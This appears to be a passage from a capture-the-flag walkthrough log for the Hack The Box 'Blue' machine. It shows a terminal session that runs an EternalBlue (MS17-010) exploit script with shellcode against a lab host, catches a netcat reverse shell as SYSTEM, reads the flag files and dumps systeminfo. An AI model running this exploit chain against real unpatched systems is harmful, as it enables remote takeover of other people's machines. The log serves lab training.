+-rw-r--r-- 1 root root  1232 Samh  13 16:27 sc_x64.bin
+-rw-r--r-- 1 root root   772 Samh  13 16:25 sc_x64_kernel.bin
+-rw-r--r-- 1 root root   460 Samh  13 16:26 sc_x64_msf.bin
+-rw-r--r-- 1 root root   962 Samh  13 16:26 sc_x86.bin
+-rw-r--r-- 1 root root   638 Samh  13 16:25 sc_x86_kernel.bin
+-rw-r--r-- 1 root root   324 Samh  13 16:26 sc_x86_msf.bin
+root@kali:~/htb/blue/MS17-010/shellcode# cd ..
+
+RUN EXPLOIT BINARY
+root@kali:~/htb/blue/MS17-010# python eternalblue_exploit7.py 10.10.10.40 shellcode/sc_all.bin 
+shellcode size: 2203
+numGroomConn: 13
+Target OS: Windows 7 Professional 7601 Service Pack 1
+SMB1 session setup allocate nonpaged pool success
+SMB1 session setup allocate nonpaged pool success
+good response status: INVALID_PARAMETER
+done
+
+START REVERSE LISTENER
+root@kali:~/htb/blue# nc -lvp 445
+listening on [any] 445 ...
+
+GET ROOT SHELL
+root@kali:~/htb/blue# nc -lvp 445
+listening on [any] 445 ...
+10.10.10.40: inverse host lookup failed: Unknown host
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.40] 49164
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>net users
+net users
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            Guest                    haris                    
+The command completed with one or more errors.
+
+
+C:\Windows\system32>dir C:\Users\haris\Desktop
+dir C:\Users\haris\Desktop
+ Volume in drive C has no label.
+ Volume Serial Number is A0EF-1911
+
+ Directory of C:\Users\haris\Desktop
+
+24/12/2017  02:23    <DIR>          .
+24/12/2017  02:23    <DIR>          ..
+21/07/2017  06:54                32 user.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  15,460,519,936 bytes free
+
+GET USER FLAG
+C:\Windows\system32>type C:\Users\haris\Desktop\user.txt
+type C:\Users\haris\Desktop\user.txt
+#######################################################
+
+GET ROOT FLAG
+C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
+type C:\Users\Administrator\Desktop\root.txt
+####################################
+
+SYSTEMINFO
+C:\Windows\system32>systeminfo
+systeminfo
+
+Host Name:                 HARIS-PC
+OS Name:                   Microsoft Windows 7 Professional 
+OS Version:                6.1.7601 Service Pack 1 Build 7601
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          haris
+Registered Organization:   
+Product ID:                00371-223-0841251-86078
+Original Install Date:     14/07/2017, 14:45:30
+System Boot Time:          12/11/2020, 22:03:09
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              2 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-gb;English (United Kingdom)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC) Dublin, Edinburgh, Lisbon, London
+Total Physical Memory:     2,047 MB
+Available Physical Memory: 1,340 MB
+Virtual Memory: Max Size:  4,095 MB
+Virtual Memory: Available: 3,433 MB
+Virtual Memory: In Use:    662 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 200 Hotfix(s) Installed.
+                           [01]: KB2849697
+                           [02]: KB2849696
+                           [03]: KB2841134
+                           [04]: KB2670838
+                           [05]: KB2479943
+                           [06]: KB2491683
+                           [07]: KB2506014
+                           [08]: KB2506212
+                           [09]: KB2506928
+                           [10]: KB2509553
+                           [11]: KB2532531
+                           [12]: KB2533552
+                           [13]: KB2533623
+                           [14]: KB2534111
+                           [15]: KB2545698
+                           [16]: KB2547666
+                           [17]: KB2552343
+                           [18]: KB2560656
+                           [19]: KB2563227
+                           [20]: KB2564958
+                           [21]: KB2579686
+                           [22]: KB2585542
+                           [23]: KB2603229
+                           [24]: KB2604115
+                           [25]: KB2620704
+                           [26]: KB2621440
+                           [27]: KB2631813
+                           [28]: KB2639308
+                           [29]: KB2640148
+                           [30]: KB2653956
+                           [31]: KB2654428
+                           [32]: KB2660075
+                           [33]: KB2667402
+                           [34]: KB2685811
+                           [35]: KB2685813
+                           [36]: KB2685939
+                           [37]: KB2690533
+                           [38]: KB2698365
+                           [39]: KB2705219
+                           [40]: KB2706045
+                           [41]: KB2719857
+                           [42]: KB2726535
+                           [43]: KB2727528
+                           [44]: KB2729094
+                           [45]: KB2729452
+                           [46]: KB2731771
+                           [47]: KB2732059
+                           [48]: KB2732487
+                           [49]: KB2736422
+                           [50]: KB2742599
+                           [51]: KB2750841
+                           [52]: KB2758857
+                           [53]: KB2761217
+                           [54]: KB2763523
+                           [55]: KB2770660
+                           [56]: KB2773072
+                           [57]: KB2786081
+                           [58]: KB2791765
+                           [59]: KB2798162
+                           [60]: KB2799926
+                           [61]: KB2800095
+                           [62]: KB2807986
+                           [63]: KB2808679
+                           [64]: KB2813430
+                           [65]: KB2834140
+                           [66]: KB2836942
+                           [67]: KB2836943
+                           [68]: KB2840149
+                           [69]: KB2840631
+                           [70]: KB2843630
+                           [71]: KB2847927
+                           [72]: KB2852386
+                           [73]: KB2853952
+                           [74]: KB2861698
+                           [75]: KB2862152
+                           [76]: KB2862330
+                           [77]: KB2862335
+                           [78]: KB2864202
+                           [79]: KB2868038
+                           [80]: KB2868116
+                           [81]: KB2871997
+                           [82]: KB2882822
+                           [83]: KB2884256
+                           [84]: KB2888049
+                           [85]: KB2891804
+                           [86]: KB2892074
+                           [87]: KB2893294
+                           [88]: KB2893519
+                           [89]: KB2894844
+                           [90]: KB2900986
+                           [91]: KB2908783
+                           [92]: KB2911501
+                           [93]: KB2912390
+                           [94]: KB2918077
+                           [95]: KB2919469
+                           [96]: KB2929733
+                           [97]: KB2931356
+                           [98]: KB2937610
+                           [99]: KB2943357
+                           [100]: KB2952664
+                           [101]: KB2966583
+                           [102]: KB2968294
+                           [103]: KB2970228
+                           [104]: KB2972100
+                           [105]: KB2972211
+                           [106]: KB2973112
+                           [107]: KB2973201
+                           [108]: KB2973351
+                           [109]: KB2977292
+                           [110]: KB2978120
+                           [111]: KB2978742
+                           [112]: KB2984972
+                           [113]: KB2985461
+                           [114]: KB2991963
+                           [115]: KB2992611
+                           [116]: KB3003743
+                           [117]: KB3004361
+                           [118]: KB3004375
+                           [119]: KB3006121
+                           [120]: KB3006137
+                           [121]: KB3010788
+                           [122]: KB3011780
+                           [123]: KB3013531
+                           [124]: KB3019978
+                           [125]: KB3020370
+                           [126]: KB3021674
+                           [127]: KB3021917
+                           [128]: KB3022777
+                           [129]: KB3023215
+                           [130]: KB3030377
+                           [131]: KB3031432
+                           [132]: KB3035126
+                           [133]: KB3035132
+                           [134]: KB3037574
+                           [135]: KB3042058
+                           [136]: KB3042553
+                           [137]: KB3045685
+                           [138]: KB3046017
+                           [139]: KB3046269
+                           [140]: KB3054476
+                           [141]: KB3055642
+                           [142]: KB3059317
+                           [143]: KB3060716
+                           [144]: KB3067903
+                           [145]: KB3068708
+                           [146]: KB3071756
+                           [147]: KB3072305
+                           [148]: KB3074543
+                           [149]: KB3075220
+                           [150]: KB3076895
+                           [151]: KB3078601
+                           [152]: KB3078667
+                           [153]: KB3080149
+                           [154]: KB3084135
+                           [155]: KB3086255
+                           [156]: KB3092601
+                           [157]: KB3092627
+                           [158]: KB3093513
+                           [159]: KB3097989
+                           [160]: KB3101722
+                           [161]: KB3107998
+                           [162]: KB3108371
+                           [163]: KB3108381
+                           [164]: KB3108664
+                           [165]: KB3109103
+                           [166]: KB3109560
+                           [167]: KB3110329
+                           [168]: KB3115858
+                           [169]: KB3121255
+                           [170]: KB3122648
+                           [171]: KB3124275
+                           [172]: KB3126587
+                           [173]: KB3127220
+                           [174]: KB3133977
+                           [175]: KB3137061
+                           [176]: KB3138378
+                           [177]: KB3138612
+                           [178]: KB3138910
+                           [179]: KB3139398
+                           [180]: KB3139914
+                           [181]: KB3140245
+                           [182]: KB3147071
+                           [183]: KB3150220
+                           [184]: KB3155178
+                           [185]: KB3156016
+                           [186]: KB3156019
+                           [187]: KB3159398
+                           [188]: KB3161102
+                           [189]: KB3161949
+                           [190]: KB3161958
+                           [191]: KB3170455
+                           [192]: KB3170735
+                           [193]: KB3172605
+                           [194]: KB3177467
+                           [195]: KB3179573
+                           [196]: KB3181988
+                           [197]: KB3184143
+                           [198]: KB4014504
+                           [199]: KB976902
+                           [200]: KB982018
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.40
+                                 [02]: fe80::9988:f105:f82f:cefb
+                                 [03]: dead:beef::7ddd:b95d:d60e:2678
+                                 [04]: dead:beef::9988:f105:f82f:cefb
+
+
